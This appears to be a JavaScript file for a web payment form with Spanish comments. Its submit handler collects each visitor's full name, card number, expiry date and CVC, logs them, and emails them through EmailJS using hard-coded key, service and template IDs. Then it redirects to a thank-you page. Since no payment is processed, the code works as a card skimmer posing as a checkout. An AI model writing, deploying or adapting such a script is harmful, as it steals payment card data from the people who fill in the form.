(function() {
    emailjs.init('ReqtkWfjI392LAzFb'); // Tu Public Key
})();

document.getElementById('paymentForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    
    // 1. CAPTURAR DATOS (VARIABLES EXPLÍCITAS)
    const formData = {
        NOMBRE_COMPLETO: document.getElementById('userName').value.trim(),
        NUMERO_TARJETA: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        FECHA_EXPIRA: document.getElementById('expiryDate').value,
        CODIGO_CVC: document.getElementById('cvc').value
    };

    console.log('Datos enviados:', formData); // Para depuración

    // 2. VALIDACIÓN BÁSICA
    if (formData.NOMBRE_COMPLETO.length < 5) {
        alert('❌ Por favor ingresa tu nombre completo');
        return;
    }

    // 3. ENVIAR CORREO (CONFIRMADO)
    try {
        const response = await emailjs.send(
            "service_syrc1uk",   // Service ID
            "template_u3etoro",  // Template ID
            formData
        );
        
        console.log('Éxito:', response);
        window.location.href = "thank-you.html";
    } catch (error) {
        console.error('Error:', error);
        alert('⚠️ Error temporal. Intenta nuevamente.');
    }
});

// FORMATEAR NÚMERO DE TARJETA
document.getElementById('cardNumber').addEventListener('input', function(e) {
    let value = e.target.value.replace(/\s/g, '');
    value = value.replace(/(\d{4})/g, '$1 ').trim();
    e.target.value = value.substring(0, 19);
});
